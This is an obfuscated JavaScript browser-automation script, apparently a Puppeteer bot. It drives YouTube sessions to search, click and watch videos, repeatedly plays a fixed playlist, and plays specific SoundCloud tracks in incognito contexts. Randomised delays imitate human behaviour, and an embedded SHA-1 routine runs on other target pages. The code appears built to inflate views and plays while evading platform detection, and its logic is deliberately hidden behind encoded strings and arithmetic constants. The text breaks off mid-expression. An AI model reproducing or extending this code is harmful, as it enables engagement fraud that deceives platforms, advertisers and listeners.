const a0 = c,
  Z = d,
  Y = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x222e + -0x15 * 0x47 + 0x9 * 0x472))) + i;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x1 * -0x1e2f + -0x1784 + -0x3 * 0x239);
    let h = e[f];
    if (c['QlTZHz'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x5 * -0x6ce + 0x1735 * -0x1 + -0xad1, r, s, t = 0x2 * -0x6d + 0x1eb2 + -0x1dd8; s = m['charAt'](t++); ~s && (r = q % (-0x196b + 0x13 * 0x1bd + -0x798) ? r * (-0x237a + -0x3ca * 0x3 + -0x2c * -0x112) + s : s, q++ % (0x7 * 0x33d + -0x4ef + -0xd8 * 0x15)) ? o += String['fromCharCode'](-0x1cf * -0xa + 0x166c + -0x2783 & r >> (-(-0x277 * -0xb + -0x207d + 0x562) * q & -0x1edd + -0x1502 + 0x1 * 0x33e5)) : 0x19fd + -0x2455 + -0xa58 * -0x1) {
          s = n['indexOf'](s);
        }
        for (let u = -0x15b7 + 0x1 * -0x22eb + -0x293 * -0x16, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x1 * -0x26f2 + 0x2bf * -0xe + -0x70))['slice'](-(0x2 * 0x6b6 + -0x1 * -0x1de + 0xa3 * -0x18));
        }
        return decodeURIComponent(p);
      };
      c['GZIRTq'] = i, b = arguments, c['QlTZHz'] = !![];
    }
    const j = e[-0x1f0d * 0x1 + -0x1 * -0xa39 + 0x14d4],
      k = f + j,
      l = b[k];
    return !l ? (h = c['GZIRTq'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x2121 + -0x237a + -0x9cd * -0x7), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x9 * -0x181e + 0x6 * -0xec3 + -0xb4c + (0x2141 * 0x1 + -0x5419 * 0x1 + 0x6d70) * random()) : await standardWaitForNetIdle(f), await wait(-0x1903 + -0x277 * -0xb + 0x116e + (-0x2bfd + -0x3db9 + 0x90c6) * random()), -0x22a4 * -0x1 + 0x557 + -0x27fa;
}
async function standardWaitForNetIdle(f) {
  return await wait(0xa35 + -0x23c9 + 0x2d1c), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x36 * -0x35 + -0x7b8 * -0x1 + -0x1 * 0x12e5;
}
async function randomWait() {
  return await wait(0x2707 + 0x1 * 0x1eb2 + 0x1 * -0x3231 + (0x1e7 * 0x2 + -0x63 + 0xf * 0x113) * random()), -0x2675 + 0x1936 + 0xd40;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x1 * -0x1e2f + -0x1784 + -0x3 * 0x239);
    let h = e[f];
    if (b['VXEJJq'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x5 * -0x6ce + 0x1735 * -0x1 + -0xad1, s, t, u = 0x2 * -0x6d + 0x1eb2 + -0x1dd8; t = n['charAt'](u++); ~t && (s = r % (-0x196b + 0x13 * 0x1bd + -0x798) ? s * (-0x237a + -0x3ca * 0x3 + -0x2c * -0x112) + t : t, r++ % (0x7 * 0x33d + -0x4ef + -0xd8 * 0x15)) ? p += String['fromCharCode'](-0x1cf * -0xa + 0x166c + -0x2783 & s >> (-(-0x277 * -0xb + -0x207d + 0x562) * r & -0x1edd + -0x1502 + 0x1 * 0x33e5)) : 0x19fd + -0x2455 + -0xa58 * -0x1) {
          t = o['indexOf'](t);
        }
        for (let v = -0x15b7 + 0x1 * -0x22eb + -0x293 * -0x16, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x1 * -0x26f2 + 0x2bf * -0xe + -0x70))['slice'](-(0x2 * 0x6b6 + -0x1 * -0x1de + 0xa3 * -0x18));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x1f0d * 0x1 + -0x1 * -0xa39 + 0x14d4,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x134b + -0x1a28 + 0x2d73; u < 0xcfd + 0x1a9d * 0x1 + -0x269a * 0x1; u++) {
          p[u] = u;
        }
        for (u = 0x2f1 + -0x1 * -0x1faf + -0x22a0; u < 0x1 * 0x13ff + 0x1de0 + 0x30df * -0x1; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0xb23 + 0x1c78 + -0x269b * 0x1), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x14 * -0x10a + 0x110d + -0x5 * -0xbf, q = 0x67 * -0x1d + -0x660 + 0x95 * 0x1f;
        for (let v = -0x65b + -0x26e9 + 0x4 * 0xb51; v < n['length']; v++) {
          u = (u + (-0x2069 + -0xf31 + 0x2f9b)) % (0x31 + 0x23 * -0x59 + 0x97 * 0x16), q = (q + p[u]) % (0x2002 + -0x104 + 0x1 * -0x1dfe), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0xd00 + -0x21d4 + 0x2fd4)]);
        }
        return t;
      };
      b['bHQOji'] = m, c = arguments, b['VXEJJq'] = !![];
    }
    const j = e[0x65f * -0x1 + 0x2b * -0x2b + 0x91 * 0x18],
      k = f + j,
      l = c[k];
    return !l ? (b['dcZNhL'] === undefined && (b['dcZNhL'] = !![]), h = b['bHQOji'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x1a28 + -0x245a + 0x379 * 0x12, 0x1 * -0x1253 + 0x1093 + 0x5b * 0x5), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x12d49 + 0x18fda + 0x2d45 * 0x3) * getRandomInt(0x828 + 0x851 * 0x1 + 0x34b * -0x5, -0x1b83 * 0x1 + -0x15f5 + 0x3 * 0x107f), h)), -0x5 * -0x25c + -0x1b4b + 0xf80;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0xcda + 0x146 * 0x12 + -0x23c6;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x26e9 + 0x38 * -0x7a + 0x419a]['split']('\x20');
    for (let k = -0xf31 + -0x5c9 + -0x6 * -0x37f; k < i['length']; k += 0x655 * -0x2 + 0x13f * 0x7 + 0x3f3)
      j += i[k] * h[i[k + (0x1 * -0x866 + -0x26b6 + 0x2f1d)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0xe4a + -0x265 + 0x10b5)['map'](l => Array['from'](l['children']))['flat'](0xb3 * 0xc + 0xce * 0x26 + -0x26f7)['map'](l => l['childNodes'][0x14ad + -0x1 * 0x1ad5 + 0x629]['childNodes'][0x1 * -0x1e1f + -0x1d4b * 0x1 + 0x3b6a]['childNodes'][-0xa8c + -0x996 * -0x2 + -0x89f]['childNodes'][-0x53 * 0x4d + -0x17cd + 0x30c4]['childNodes'][0x12bf + 0x1c47 + 0x1 * -0x2f05]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x2009 + -0x1 * 0x2702 + 0x4af3, 0x6e9 * 0x2 + -0x12fe + 0x22 * 0xba)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x2 * -0x21e3 + 0x1 * 0x5e0e + -0x2 * 0x339e);
  const h = await getMaxTime(f),
    i = Math['min']((-0x2dbc * -0x6 + 0x1ebd + -0x46c5) * getRandomInt(-0xe * 0x1eb + -0x2277 * -0x1 + -0x289 * 0x3, 0x3e1 + -0x16f2 + 0x1316), h);
  return await wait(i), -0x3ce * 0x1 + -0x8 * 0x35 + 0x577;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    const R = c;
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x6 * 0x3e8 + 0x7e2 + -0x1 * -0xf8e]['children'][-0x531 * 0x1 + 0xfa6 + 0xa75 * -0x1][R(0x14)][0x1bfc + 0x1bb1 + -0x3 * 0x128f]['children'][-0x78d + -0x193b + 0x4 * 0x832]['children'][0x148 * 0x2 + -0xf * -0x6d + -0x8f3]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x515 + -0x2039 * 0x1 + 0x1b25;
}
async function searchAndView(f) {
  const S = d;
  log('searching\x20' + 'youtube\x20re' + S(0xe)), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0xb2b * -0x1 + -0x55 * -0x2 + -0xae5 * -0x1 + (-0x15 * 0xb3 + -0xe41 + 0x1d22) * random()
  }), await wait(-0xc78 + -0xcaa + 0x2 * 0xd8b + (-0x5b5 + -0x711 + 0x33 * 0x46) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const T = d,
      k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x43 * -0xa + 0x90b + -0x1 * 0x66b]['childNodes'][-0x137 + 0x80 * -0x25 + 0x13b8]['childNodes'][0x16e8 + -0x90 * -0x1b + -0x2617]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x1e11 * 0x1 + -0xff8 + -0x6 * -0x7ad]['childNodes'][0x1e43 + 0x1129 + -0x2f6c][T(0x12)][0x1a1d + 0x26e + -0x1c89]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        const U = c;
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))[U(0x1e)](0x21c + -0x1f48 + -0xb * -0x2a7),
          r = -0x4d8 + -0x102e + 0x1506;
        for (let u = 0x3b + 0x4cd * -0x8 + 0x262d; u < q['length']; u += -0x83 * 0x26 + -0x16e1 * -0x1 + -0x36d)
          r += q[u] * k[q[u + (0x1 * -0x14c9 + -0xad4 + 0x13 * 0x1aa)]];
        return r;
      }(n);
  });
  await wait((-0x1b * -0x8b + 0x644 * -0x1 + -0xb5 * -0x47) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x1ecd + 0x17b3d * 0x1 + -0xa * 0x1191) * getRandomInt(-0x51b + -0x5d * -0x1f + 0x9 * -0xaf, 0x9de + 0x3c * 0x35 + -0xb20 * 0x2), h + (0x1 * -0x425 + -0x1b * 0x93 + -0x1397 * -0x2));
  return await wait(i), -0xb1f + -0x30e * -0x1 + 0x812;
}
async function keyWatch(f) {
  const V = c;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x1c39 + -0x1d7 + -0x3c2 * -0x8), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + V(0x1a) + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        const W = d;
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', W(0x18));
      }, 0x1281 + 0x8a5 * 0x1 + 0xa * -0x18b + (0x1 * -0xdff + 0x580 + 0xc67) * Math['random']());
    });
  }, 0x1051 * 0x2 + -0x1 * 0x33f + -0x1 * 0x20b);
  await wait(-0x916ed * 0x1 + 0x66 * -0x1b3 + 0xe581f);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x4633 + -0x1 * 0x171a1 + -0x72 * -0x5ea) * getRandomInt(-0x127d + 0x4 * 0x265 + -0x1 * -0x8ed, 0x2401 + 0x851 + 0x1 * -0x2c39)), clearInterval(h), 0x4 * 0x102 + -0x1 * 0x235c + 0x1f55;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0xb84 + -0x1 * 0x25d7 + 0x315b;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x6e6 * 0x1 + -0xc84 + 0x1 * 0x59f;
    await randomWait();
  }
  return 0x1b0 + 0x9f9 + -0xba8;
}

function fetchRandomSC() {
  const X = c;
  return Math['random']() <= -0x240 + 0xf2c + -0xcec + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x1eec + 0x13e9 + -0x32d5 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + X(0x13) + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x29c * -0x3 + 0x2 * -0x65 + -0x44f * -0x2 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x15c1 + 0x1b93 + -0x5d2;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0xd7ea * -0x1 + -0x97b8 + 0x2 * 0x10fb5 + getRandomInt(-0x1717 + 0xc1 * -0x43 + 0x4219 * 0x2, 0x308c * -0x2 + -0xbcc3 + 0x1930b));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x46d * -0x1 + -0x187f * 0x1 + 0x1413), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x1489 + -0x2043 + -0x1a66 * -0x2;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0xca * -0x26 + -0x1dfd + 0x3bf9, 0x2 * -0x207 + -0xf1 * -0x26 + -0x1f86)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x1 * 0x25 + -0x1d * 0x54 + 0x1179 + floor((-0x128d * 0x1 + -0x16ac + 0x2d21) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0xcf4efa1c + -0xe4dda424 * 0x1 + 0x680a338 * 0x17),
          0x429b75 + -0x76e067 + 0x2 * 0x5a2279,
          0x182 * 0x43 + 0x83e5 + -0x68eb * 0x1,
          0x15db + -0x1 * -0x22bf + -0x381a
        ], y = [
          -0x65b * 0x1 + 0x23b * 0xd + -0x4a * 0x4e,
          -0x1e37 + 0x5e * -0x2f + -0x2f89 * -0x1,
          -0x1 * 0xdfe + -0x81b + 0x1621,
          -0x1 * -0x1882 + 0x6d9 * -0x4 + 0x12 * 0x29
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x26bb + -0x1 * 0x13b8 + 0x3a74)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x7a2 + -0x2 * 0x62d + 0x4b8; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x11f0 + -0x83 * 0x2a + 0x276e) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x4c * -0x47 + -0x1 * -0x19d5 + -0x2ee9] = A[-0x1749 + 0xc36 * 0x3 + -0xb3 * 0x13] = A[0x1 * -0x20c1 + 0xc50 + 0xa39 * 0x2] = A[-0x692 * -0x2 + 0x1d3d + -0x2a5f] = A[-0xd * -0xda + 0xc4 * -0x2 + -0x9 * 0x10f] = A[-0x21ab + 0x1d50 + 0x45f * 0x1] = A[0x1a7e + -0x953 * 0x1 + 0xa * -0x1b7] = A[0x79 + 0x2101 + -0x2174] = A[0x1 * -0x195b + 0xa53 + 0xf0f] = A[0x2 * 0x23f + -0x98 * -0x3d + -0x28ae] = A[0x7d + -0x25a2 + 0x252e] = A[-0x475 + 0x3 * -0xfa + 0x76d] = A[-0x24f0 + -0x10d2 + 0x35cd] = A[-0x2e * 0xb6 + 0x1e8f * -0x1 + 0x3f4f] = A[-0x462 + 0x46b * 0x1 + 0x4] = A[0x5 * -0x22c + -0x68 * -0x23 + -0x34e] = A[-0x1ace + 0x1e94 + -0x13d * 0x3] = -0x3 * 0x123 + -0x26b * 0xb + 0x1e02, this['blocks'] = A) : this['blocks'] = [
                -0xb5 * 0x11 + -0x2 * 0x2d8 + 0x11b5,
                -0x3b4 * 0x2 + -0x169b + 0x1e03,
                0x1 * -0x1211 + -0x151b + 0x272c,
                0x43 * 0x1a + -0xe9a + 0x3e6 * 0x2,
                -0x1d4b + 0x133a + 0xa11,
                0xc0f + 0x1d8 + 0xde7 * -0x1,
                0x1 * -0xf9e + -0x379 * -0x5 + -0x1bf,
                0x2b9 + 0x8b4 + -0xb6d,
                0x3 * -0x73 + -0x1 * -0x9e6 + -0xb * 0xc7,
                0x1 * 0x1223 + -0x1c3e + 0xa1b,
                -0x2386 + -0x55d * 0x7 + 0x2b * 0x1b3,
                -0x1 * -0x1537 + 0x1 * 0x2069 + 0x35a0 * -0x1,
                -0x10ee + 0x1 * 0xbcc + 0x522,
                0x4 * 0x525 + -0x1 * 0xb83 + 0xd3 * -0xb,
                -0x6 * 0x49d + -0x1a77 + 0xa7 * 0x53,
                -0x1a63 * -0x1 + 0x80e + 0x2271 * -0x1,
                -0x1b15 * 0x1 + -0xa67 * 0x1 + 0x257c
              ], this['h0'] = 0x19ac3748 + 0x262801a9 * 0x3 + -0x376 * 0xaa753, this['h1'] = -0x5ec736b * -0x8 + 0x105e * -0x198eff + -0x1 * -0x262bc81d3, this['h2'] = -0xaa9 * 0x51c9d + 0x4a087 * -0x61c + 0xeb7d9b67, this['h3'] = -0x1 * -0x17f160ad + 0x1c242f60 + -0x23e33b97, this['h4'] = -0xe3000d83 * -0x1 + -0x32bfffba + 0x1392d427 * 0x1, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x100f + -0x3 * 0x7bf + 0x274c, this['finalized'] = this['hashed'] = -0x25c3 * -0x1 + 0x6c4 * 0x4 + -0x40d3, this['first'] = -0x1bf1 + 0x637 * 0x1 + 0x15bb;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x1b0d + 0xfe4 + 0xb29, O = J['length'] || -0x74 + 0x1 * -0x1d07 + 0x1 * 0x1d7b, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x2000 + 0x52e + 0x1ad2, P[0x2d * -0x4b + 0x1b88 + -0x1 * 0xe59] = this['block'], P[-0xbf * 0x2e + 0xe * 0x19f + 0xbb0] = P[0x1e77 + -0x18f6 + -0xb * 0x80] = P[0x9d5 * 0x3 + 0x14e9 * 0x1 + 0x3266 * -0x1] = P[0x23b * 0x2 + 0x1b4 * -0xe + 0x1365] = P[0x1f46 + 0x108a + 0x17 * -0x214] = P[-0x17e * -0x4 + 0x1 * 0x259a + -0x2b8d] = P[-0x2698 + -0xe21 + 0x1 * 0x34bf] = P[0x1e9e + 0x13 * -0x119 + 0x4de * -0x2] = P[0x1 * 0xe61 + -0x8f0 + -0x569] = P[0x4a4 + -0xf * -0xa3 + -0xe28] = P[0x2659 + -0x2 * 0xf56 + -0x7a3] = P[-0x1b58 + -0x1 * 0x1cf7 + 0x385a] = P[-0x773 * 0x5 + 0x1866 + 0xce5] = P[0x1a * -0x128 + 0x1af * 0x13 + 0x4 * -0x78] = P[0x21ed + 0x93d + -0x2b1c] = P[0x2e * 0x2 + -0x18d4 + 0x82d * 0x3] = -0x847 * 0x3 + -0x1ee3 + 0x37b8), K) {
                    for (N = this['start']; M < O && N < -0x1adc + 0x2 * 0xf36 + -0x350; ++M)
                      P[N >> 0x1 * 0xa11 + 0x217d + 0x3a1 * -0xc] |= J[M] << y[-0x2329 + 0x2 * -0x4f7 + -0x2 * -0x168d & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0xf47 * -0x2 + 0x152b + 0x1 * -0x3379; ++M)
                      (L = J['charCodeAt'](M)) < -0x1 * -0xcdb + 0x5b * -0x13 + -0x6 * 0xef ? P[N >> 0x903 + 0xbbf * 0x3 + -0x2c3e] |= L << y[0x1 * 0x6ee + -0x4 * -0x407 + 0x49b * -0x5 & N++] : L < -0x19a7 + 0x36e + 0x1e39 ? (P[N >> -0xd * 0x59 + 0x1f8b + -0x1b04] |= (-0x673 + -0x5 * -0x4ed + 0x2 * -0x8b7 | L >> -0x4f3 * -0x2 + 0x1f76 * 0x1 + 0x197 * -0x1a) << y[0x1543 + -0x424 * 0x8 + 0xbe0 & N++], P[N >> -0x1905 + -0x900 + -0x1 * -0x2207] |= (-0x263 * 0x10 + 0x5f4 + 0x4 * 0x82f | 0x18d5 + -0xa34 * 0x3 + 0x1 * 0x606 & L) << y[-0xa7c * -0x2 + 0x8 * 0x46f + -0x386d & N++]) : L < 0x1abf7 + -0x1b2a * 0x7 + -0x15d1 || L >= 0x1 * 0x4405 + 0x1635 + 0x42e3 * 0x2 ? (P[N >> -0x1748 + -0x1 * 0x1055 + -0x1 * -0x279f] |= (-0x13c7 + 0xcd5 + 0x7d2 | L >> 0x1462 + 0x1902 + -0x1 * 0x2d58) << y[-0x194f + 0x1 * 0x1ea1 + -0x54f & N++], P[N >> 0x1fe2 + -0x94 * -0x21 + -0x32f4] |= (0x1 * 0x2421 + -0xb8a + -0x1817 | L >> -0x5 * 0x429 + 0x7b7 + 0x1 * 0xd1c & -0x209 + -0x13e4 + 0x58b * 0x4) << y[-0x847 + 0x15a1 + -0xd57 & N++], P[N >> 0x1727 * -0x1 + -0x695 * 0x3 + 0x2ae8] |= (-0xdc * -0x12 + -0x1 * 0x2699 + -0x107 * -0x17 | 0x19d4 + -0x1cf4 + 0x35f & L) << y[-0x2ef * -0x6 + 0x19 * -0xe9 + 0x52a & N++]) : (L = 0x9922 + -0x2b7 * 0x6a + 0x186a4 * 0x1 + ((-0x33b * 0x7 + -0x53d + 0x1fd9 & L) << 0x3b * 0x5 + 0x2 * -0x337 + 0x551 | 0x12 * -0x83 + -0x244f + -0x18c2 * -0x2 & J['charCodeAt'](++M)), P[N >> 0x895 + -0x4c * -0x13 + -0xe37 * 0x1] |= (0x23c6 + -0x3 * -0xa81 + -0x4259 | L >> 0x1 * -0x11d2 + -0x1 * -0x6c7 + 0xb1d) << y[0xd8d * -0x2 + -0x1 * -0x156b + 0x2 * 0x2d9 & N++], P[N >> -0x5 * -0x337 + 0x1e3 + -0x11f4 * 0x1] |= (-0x13d * -0xc + -0x1c83 + 0x1 * 0xe27 | L >> -0xcfc + 0x8c1 + 0x447 & 0x1 * -0x1816 + 0x5c * -0x28 + -0x26b5 * -0x1) << y[-0x1484 + 0x190f + -0x488 & N++], P[N >> 0x2633 + -0x4c7 * 0x7 + 0x13 * -0x40] |= (-0xd06 + -0x1051 * -0x1 + -0x2cb | L >> 0x3 * 0x83e + 0x1 * 0x2173 + -0x3a27 & -0x1 * 0xc73 + 0x13 * -0x19b + 0x1 * 0x2b33) << y[-0x1 * -0x807 + -0x2 * -0x2f + 0x3a * -0x25 & N++], P[N >> 0x137a + 0xc * -0x32b + 0x1 * 0x128c] |= (0xcf8 + -0x97 * 0x30 + 0xfd8 | 0xc47 * 0x1 + 0x76 